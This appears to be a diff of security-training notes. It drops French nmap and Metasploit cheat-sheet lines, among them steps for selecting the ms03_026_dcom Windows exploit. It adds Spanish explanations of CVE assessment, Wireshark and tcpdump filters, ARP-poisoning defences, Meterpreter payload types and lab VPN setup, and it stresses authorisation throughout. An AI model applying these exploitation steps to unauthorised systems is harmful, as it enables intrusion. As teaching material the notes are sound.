-nmap -A *addr ip cible* #Active la détection du système d'exploitation et des versions (nous donnes les ports ouverts)
+
+Ejemplo:
+
+```text
+CVE-2024-XXXX
 ```
+
+Una CVE no implica automáticamente que un sistema esté comprometido. Para evaluar el riesgo se debe comprobar:
+
+- producto y versión afectados;
+- configuración concreta;
+- exposición del servicio;
+- disponibilidad de parches;
+- mitigaciones existentes;
+- impacto potencial;
+- probabilidad real de explotación.
+
+Herramientas como OpenVAS/Greenbone, Nessus o Nikto pueden ayudar a detectar configuraciones o vulnerabilidades conocidas, pero sus resultados requieren validación manual.
+
+***
+
+### Captura de tráfico: Wireshark y tcpdump
+
+Wireshark permite capturar y analizar tráfico de red de forma gráfica. Es útil para diagnosticar problemas, comprender protocolos y revisar comunicaciones de tu propio equipo o laboratorio.
+
+Filtros de ejemplo:
+
+```text
+ip.addr == 192.168.1.50
 ```
-######vulnerabilites connues######
-nmap --script=vuln *addr ip cible* #vulnerabilite connue, --script=<lua scripts>: ici <lua scripts> est une liste de répertoires ou de scripts séparés par des virgules
-searchsploit *nom du service qui tourne*
-msfconsole search *nom du service qui tourne*
+
+Muestra tráfico hacia o desde esa IP.
+
+```text
+ip.addr == 192.168.1.50 && http
 ```
+
+Muestra tráfico HTTP relacionado con esa IP. HTTP sin TLS transmite datos sin cifrar; HTTPS protege el contenido mediante TLS.
+
+`tcpdump` permite capturar tráfico desde la línea de comandos:
+
+```bash
+sudo tcpdump -i eth0 -n port 80
 ```
-######exploit######
-msfconsole search cve:2003-0352 #chercher un exploit qui correspond a une faille par son CVE
-show exploits #afficher tous les exploits disponibles sur Metasploit
-search nom_exploit #pour chercher un exploit
-use nom_exploit #par exemple : use exploit/windows/dcerpc/ms03_026_dcom (path sous name quand on a search avec le cve)
-show targets
-set target *chiffre target* #Configurer la target
-info nom_exploit #Avoir des informations sur un exploit
-show options #Voir les options d’un exploit
+
+- `-i eth0`: especifica la interfaz.
+- `-n`: evita resolver nombres, mostrando IP y puertos numéricos.
+- `port 80`: filtra tráfico HTTP no cifrado.
+
+Nunca captures tráfico de terceras personas o de redes ajenas sin permiso explícito.
+
+***
+
+### ARP y ataques de intermediario
+
+ARP traduce una dirección IPv4 local a una dirección MAC. En una red IPv4 Ethernet, un equipo puede preguntar:
+
+> “¿Quién tiene la IP 192.168.1.1? Responde con tu dirección MAC”.
+
+El envenenamiento ARP intenta manipular esas asociaciones para redirigir tráfico a través de un intermediario. Es un riesgo especialmente relevante en redes locales no segmentadas o Wi‑Fi abiertos.
+
+Medidas de protección:
+
+- utilizar HTTPS y validar certificados;
+- usar VPN en redes no confiables;
+- segmentar redes;
+- usar protecciones de capa 2 en switches empresariales, como DHCP Snooping y Dynamic ARP Inspection;
+- monitorizar cambios anómalos de asociaciones IP-MAC;
+- evitar redes Wi‑Fi abiertas cuando sea posible.
+
+***
+
+### Malware, exploits y payloads
+
+| Concepto | Significado |
+|---|---|
+| Vulnerabilidad | Debilidad en software, configuración o diseño. |
+| Exploit | Técnica o código que aprovecha una vulnerabilidad. |
+| Payload | Acción o código ejecutado después de lograr la ejecución. |
+| Listener | Servicio que espera una conexión entrante, normalmente en un laboratorio. |
+| Shell | Interfaz de línea de comandos obtenida en un sistema. |
+| Reverse shell | La conexión se inicia desde la máquina objetivo hacia el sistema de pruebas. |
+| Bind shell | El sistema objetivo queda escuchando en un puerto y el operador se conecta a él. |
+
+Metasploit es un framework de pruebas de seguridad que organiza módulos para tareas de reconocimiento, explotación y pos-explotación. Debe utilizarse exclusivamente en sistemas propios, entornos de formación o con autorización contractual.
+
+`msfvenom` es la herramienta de Metasploit para generar y codificar payloads; reemplazó a las herramientas antiguas `msfpayload` y `msfencode`. [docs.metasploit](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
+
+#### Payloads staged y stageless
+
+Un payload **staged** se entrega en dos fases:
+
+1. un componente inicial pequeño, llamado *stager*, establece la comunicación;
+2. posteriormente se transfiere una segunda fase más completa.
+
+Un payload *stageless* contiene toda la funcionalidad en un único archivo. Por ello suele ser mayor, pero no necesita descargar una segunda fase después de ejecutarse. Metasploit distingue, por ejemplo, `windows/meterpreter/reverse_tcp` como staged y `windows/meterpreter_reverse_tcp` como stageless. [docs.metasploit](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html)
+
+Esta distinción es importante para entender el funcionamiento técnico de los laboratorios, no para generar archivos contra sistemas ajenos.
+
+***
+
+## IV. Entornos de práctica: Hack The Box y TryHackMe
+
+Hack The Box y TryHackMe ofrecen máquinas y laboratorios diseñados expresamente para aprender seguridad ofensiva y defensiva de forma legal.
+
+Para acceder a laboratorios que requieren VPN, normalmente se utiliza un archivo de configuración OpenVPN:
+
+```bash
+sudo apt install openvpn
+sudo openvpn --config archivo.ovpn
 ```
+
+Cuando aparece un mensaje equivalente a “Initialization Sequence Completed”, significa que el túnel VPN se ha establecido correctamente.
+
+Antes de empezar una máquina de laboratorio, conviene seguir una metodología:
+
+1. Revisar el alcance y las normas de la plataforma.
+2. Conectarse a la VPN si es necesaria.
+3. Identificar la IP asignada a la máquina objetivo de laboratorio.
+4. Realizar reconocimiento y enumeración dentro del entorno permitido.
+5. Documentar los hallazgos.
+6. Comprender la vulnerabilidad antes de probar una explotación.
+7. Aplicar las conclusiones a medidas defensivas reales.
+
+## Resumen esencial
+
+- Linux gestiona usuarios, permisos y procesos mediante herramientas como `sudo`, `chmod`, `ps`, `top` y `systemctl`.
+- SSH proporciona administración remota cifrada mediante autenticación, intercambio de claves y cifrado de la sesión. [openssh](https://www.openssh.org/manual.html)
+- El modelo OSI separa la comunicación en capas; Ethernet opera principalmente en capa 2, IP en capa 3 y TCP/UDP en capa 4.
+- Las direcciones MAC identifican interfaces dentro de una LAN; las direcciones IP permiten comunicar redes distintas.
+- DHCP asigna configuración de red, DNS resuelve dominios e HTTP/HTTPS transporta contenido web.
+- Nmap, Wireshark y tcpdump son herramientas útiles para diagnóstico y auditoría autorizada.
+- Un escaneo o una CVE no prueban por sí mismos que exista una intrusión o que una vulnerabilidad sea explotable.
+- Un pentest responsable termina con un informe, remediación y verificación, no con persistencia ni ocultación de rastros.
